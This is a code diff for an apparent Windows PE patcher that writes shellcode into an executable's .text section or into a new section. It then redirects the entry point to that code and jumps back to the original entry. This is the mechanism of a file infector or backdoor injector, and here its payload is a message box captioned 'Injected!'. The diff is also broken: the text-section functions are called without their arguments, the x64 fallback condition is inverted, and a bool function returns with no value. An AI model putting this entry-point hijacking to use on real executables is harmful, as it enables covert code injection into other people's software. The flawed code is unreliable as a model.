@@ -1,6 +1,8 @@
 #include "patcher.h"
 #include "../utils/utils.h"
 
+#pragma comment(lib, "user32.lib")
+
 // MessageBoxA shellcode (32-bit)
 const BYTE shellcode32[] = {
     0x6A, 0x00,                               // push 0
@@ -26,6 +28,173 @@ const BYTE shellcode64[] = {
     0xE9, 0,0,0,0                             // jmp original entry
 };
 
+#pragma region Helper
+// adding to .text section
+bool patch_x64_add_to_text(std::vector<char>& data, DWORD peOffset)
+{
+    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)&data[peOffset];
+    IMAGE_OPTIONAL_HEADER64* opt = &nt->OptionalHeader;
+    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
+
+    // Find .text section
+    IMAGE_SECTION_HEADER* text = nullptr;
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+        if (strncmp((char*)sections[i].Name, ".text", 5) == 0) {
+            text = &sections[i];
+            break;
+        }
+    }
+
+    if (!text) {
+        std::cerr << "[-] .text section not found.\n";
+        return false;
+    }
+
+    DWORD textRawOffset = text->PointerToRawData;
+    DWORD textRawSize = text->SizeOfRawData;
+    DWORD textVA = text->VirtualAddress;
+
+    // Shellcode
+    BYTE patch[sizeof(shellcode64)];
+    memcpy(patch, shellcode64, sizeof(shellcode64));
+
+    const char* msg = "Hello from x64 MessageBoxA!";
+    const char* cap = "Injected!";
+    size_t msgLen = strlen(msg) + 1;
+    size_t capLen = strlen(cap) + 1;
+
+    size_t totalNeeded = sizeof(patch) + msgLen + capLen;
+
+    for (DWORD offset = 0; offset <= textRawSize - totalNeeded; ++offset) {
+        bool fits = true;
+        for (size_t i = 0; i < totalNeeded; ++i) {
+            if (data[textRawOffset + offset + i] != 0x00) {
+                fits = false;
+                break;
+            }
+        }
+
+        if (fits) {
+            DWORD shellOffset = textRawOffset + offset;
+            DWORD msgOffset = shellOffset + sizeof(patch);
+            DWORD capOffset = msgOffset + msgLen;
+
+            memcpy(&data[msgOffset], msg, msgLen);
+            memcpy(&data[capOffset], cap, capLen);
+
+            ULONGLONG baseVA = opt->ImageBase + textVA + offset;
+
+            *(ULONGLONG*)(patch + 9) = baseVA + sizeof(patch);               // msg
+            *(ULONGLONG*)(patch + 20) = baseVA + sizeof(patch) + msgLen;      // cap
+
+            HMODULE user32 = LoadLibraryA("user32.dll");
+            FARPROC msgbox = GetProcAddress(user32, "MessageBoxA");
+            if (!msgbox) {
+                std::cerr << "[-] Failed to resolve MessageBoxA.\n";
+                return false;
+            }
+            *(ULONGLONG*)(patch + 31) = (ULONGLONG)msgbox;
+
+            // Calculate jump offset to original EP
+            DWORD originalEP = opt->AddressOfEntryPoint;
+            *(DWORD*)(patch + sizeof(patch) - 4) = originalEP - (textVA + offset + sizeof(patch));
+
+            memcpy(&data[shellOffset], patch, sizeof(patch));
+
+            opt->AddressOfEntryPoint = textVA + offset;
+
+            std::cout << "[+] Injected shellcode into .text section (x64).\n";
+            return true;
+        }
+    }
+
+    std::cerr << "[-] Not enough space in .text section for x64 shellcode.\n";
+    return false;
+}
+
+bool patch_x86_add_to_text(std::vector<char>& data, DWORD peOffset)
+{
+    IMAGE_NT_HEADERS32* nt = (IMAGE_NT_HEADERS32*)&data[peOffset];
+    IMAGE_OPTIONAL_HEADER32* opt = &nt->OptionalHeader;
+    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
+
+    // Find .text section
+    IMAGE_SECTION_HEADER* text = nullptr;
+    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+        if (strncmp((char*)sections[i].Name, ".text", 5) == 0) {
+            text = &sections[i];
+            break;
+        }
+    }
+
+    if (!text) {
+        std::cerr << "[-] .text section not found.\n";
+        return false;
+    }
+
+    DWORD textRawOffset = text->PointerToRawData;
+    DWORD textRawSize = text->SizeOfRawData;
+    DWORD textVA = text->VirtualAddress;
+
+    // Shellcode
+    BYTE patch[sizeof(shellcode32)];
+    memcpy(patch, shellcode32, sizeof(shellcode32));
+
+    const char* msg = "Hello from text MessageBoxA!";
+    const char* cap = "Injected!";
+    size_t msgLen = strlen(msg) + 1;
+    size_t capLen = strlen(cap) + 1;
+
+    // Estimate total space needed
+    size_t totalNeeded = sizeof(patch) + msgLen + capLen;
+
+    // Search for a block of nulls in the .text section
+    for (DWORD offset = 0; offset <= textRawSize - totalNeeded; ++offset) {
+        bool fits = true;
+        for (size_t i = 0; i < totalNeeded; ++i) {
+            if (data[textRawOffset + offset + i] != 0x00) {
+                fits = false;
+                break;
+            }
+        }
+
+        if (fits) {
+            DWORD shellOffset = textRawOffset + offset;
+            DWORD msgOffset = shellOffset + sizeof(patch);
+            DWORD capOffset = msgOffset + msgLen;
+
+            // Write strings
+            memcpy(&data[msgOffset], msg, msgLen);
+            memcpy(&data[capOffset], cap, capLen);
+
+            // Patch shellcode with addresses
+            *(DWORD*)(patch + 3) = opt->ImageBase + textVA + offset + sizeof(patch) + msgLen; // cap
+            *(DWORD*)(patch + 8) = opt->ImageBase + textVA + offset + sizeof(patch);          // msg
+            HMODULE user32 = LoadLibraryA("user32.dll");
+            FARPROC msgbox = GetProcAddress(user32, "MessageBoxA");
+            if (!msgbox) {
+                std::cerr << "[-] Failed to resolve MessageBoxA.\n";
+                return false;
+            }
+            *(DWORD*)(patch + 13) = (DWORD)(DWORD_PTR)msgbox;
+            *(DWORD*)(patch + 17) = opt->AddressOfEntryPoint - (textVA + offset + sizeof(patch));
+
+            // Inject shellcode
+            memcpy(&data[shellOffset], patch, sizeof(patch));
+
+            // Redirect entry point
+            opt->AddressOfEntryPoint = textVA + offset;
+
+            std::cout << "[+] Injected shellcode into .text section.\n";
+            return true;
+        }
+    }
+
+    std::cerr << "[-] Not enough space in .text section for shellcode.\n";
+    return false;
+}
+
+// adding new section
 bool has_space_for_new_section_header_x64(IMAGE_NT_HEADERS64* nt, DWORD peOffset, size_t fileSize)
 {
     WORD currentSections = nt->FileHeader.NumberOfSections;
@@ -45,8 +214,7 @@ bool has_space_for_new_section_header_x86(IMAGE_NT_HEADERS32* nt, DWORD peOffset
         nextSectionHeaderEnd <= fileSize;
 }
 
-
-void patch_x64(std::vector<char>& data, DWORD peOffset)
+bool patch_x64_add_new_section(std::vector<char>& data, DWORD peOffset)
 {
     IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)&data[peOffset];
     IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
@@ -58,7 +226,7 @@ void patch_x64(std::vector<char>& data, DWORD peOffset)
 
     if (!has_space_for_new_section_header_x64(nt, peOffset, data.size())) {
         std::cerr << "[-] Not enough space in PE headers for new section header.\n";
-        return;
+        return false;
     }
 
     // Add .msgbox section
@@ -74,10 +242,14 @@ void patch_x64(std::vector<char>& data, DWORD peOffset)
     nt->FileHeader.NumberOfSections++;
     opt->SizeOfImage = newSec.VirtualAddress + newSec.Misc.VirtualSize;
 
+    if (newRaw + 0x1000 > data.max_size()) {
+        std::cerr << "[-] File too large after resizing.\n";
+        return false;
+    }
+
     data.resize(newRaw + 0x1000, 0x00);
 
     DWORD originalEP = opt->AddressOfEntryPoint;
-    DWORD epVA = opt->ImageBase + newSec.VirtualAddress;
 
     BYTE patch[sizeof(shellcode64)];
     memcpy(patch, shellcode64, sizeof(shellcode64));
@@ -88,6 +260,11 @@ void patch_x64(std::vector<char>& data, DWORD peOffset)
     DWORD msgOffset = newRaw + 0x100;
     DWORD capOffset = msgOffset + strlen(msg) + 1;
 
+    if (capOffset + strlen(cap) + 1 > data.size()) {
+        std::cerr << "[-] Not enough space for strings.\n";
+        return false;
+    }
+
     std::memcpy(&data[msgOffset], msg, strlen(msg) + 1);
     std::memcpy(&data[capOffset], cap, strlen(cap) + 1);
 
@@ -96,14 +273,21 @@ void patch_x64(std::vector<char>& data, DWORD peOffset)
     *(ULONGLONG*)(patch + 20) = opt->ImageBase + newSec.VirtualAddress + 0x100 + strlen(msg) + 1; // cap
     HMODULE user32 = LoadLibraryA("user32.dll");
     FARPROC msgbox = GetProcAddress(user32, "MessageBoxA");
+    if (!msgbox) {
+        std::cerr << "[-] Failed to resolve MessageBoxA.\n";
+        return false;
+    }
+
     *(ULONGLONG*)(patch + 31) = (ULONGLONG)msgbox;
     *(DWORD*)(patch + sizeof(patch) - 4) = originalEP - newSec.VirtualAddress - sizeof(patch);
 
     memcpy(&data[newRaw], patch, sizeof(patch));
     opt->AddressOfEntryPoint = newSec.VirtualAddress;
+
+    return true;
 }
 
-void patch_x86(std::vector<char>& data, DWORD peOffset)
+bool patch_x86_add_new_section(std::vector<char>& data, DWORD peOffset)
 {
     IMAGE_NT_HEADERS32* nt = (IMAGE_NT_HEADERS32*)&data[peOffset];
     IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
@@ -115,7 +299,7 @@ void patch_x86(std::vector<char>& data, DWORD peOffset)
 
     if (!has_space_for_new_section_header_x86(nt, peOffset, data.size())) {
         std::cerr << "[-] Not enough space in PE headers for new section header.\n";
-        return;
+        return false;
     }
 
     IMAGE_SECTION_HEADER newSec = {};
@@ -130,10 +314,14 @@ void patch_x86(std::vector<char>& data, DWORD peOffset)
     nt->FileHeader.NumberOfSections++;
     opt->SizeOfImage = newSec.VirtualAddress + newSec.Misc.VirtualSize;
 
+    if (newRaw + 0x1000 > data.max_size()) {
+        std::cerr << "[-] File too large after resizing.\n";
+        return false;
+    }
+
     data.resize(newRaw + 0x1000, 0x00);
 
     DWORD originalEP = opt->AddressOfEntryPoint;
-    DWORD epVA = opt->ImageBase + newSec.VirtualAddress;
 
     BYTE patch[sizeof(shellcode32)];
     memcpy(patch, shellcode32, sizeof(shellcode32));
@@ -148,6 +336,10 @@ void patch_x86(std::vector<char>& data, DWORD peOffset)
 
     HMODULE user32 = LoadLibraryA("user32.dll");
     FARPROC msgbox = GetProcAddress(user32, "MessageBoxA");
+    if (!msgbox) {
+        std::cerr << "[-] Failed to resolve MessageBoxA.\n";
+        return false;
+    }
 
     *(DWORD*)(patch + 3) = opt->ImageBase + newSec.VirtualAddress + 0x100 + strlen(msg) + 1;
     *(DWORD*)(patch + 8) = opt->ImageBase + newSec.VirtualAddress + 0x100;
@@ -156,9 +348,13 @@ void patch_x86(std::vector<char>& data, DWORD peOffset)
 
     memcpy(&data[newRaw], patch, sizeof(patch));
     opt->AddressOfEntryPoint = newSec.VirtualAddress;
+
+    return true;
 }
+#pragma endregion
 
 bool patcher::patch_pe(const std::string& filename)
+
 {
     std::ifstream in(filename, std::ios::binary);
     if (!in) return false;
@@ -184,12 +380,32 @@ bool patcher::patch_pe(const std::string& filename)
     if (is64)
     {
         std::cout << "[*] 64-bit PE detected.\n";
-        patch_x64(data, peOffset);
+        // 1. finding enough free space in .text
+        bool status = patch_x64_add_to_text();
+        if (status)
+        {
+            // 2. adding a new section if not enough space in .text
+            status = patch_x64_add_new_section(data, peOffset);
+            if (!status) {
+                std::cout << "[*] unable to create patched pe file.\n";
+                return;
+            }
+        }
     }
     else
     {
         std::cout << "[*] 32-bit PE detected.\n";
-        patch_x86(data, peOffset);
+        // 1. finding enough free space in .text
+        bool status = patch_x86_add_to_text();
+        if (!status)
+        {
+            // 2. adding a new section if not enough space in .text
+            status = patch_x86_add_new_section(data, peOffset);
+            if (!status) {
+                std::cout << "[*] unable to create patched pe file.\n";
+                return;
+            }
+        }
     }
 
     std::ofstream out("patched.exe", std::ios::binary);
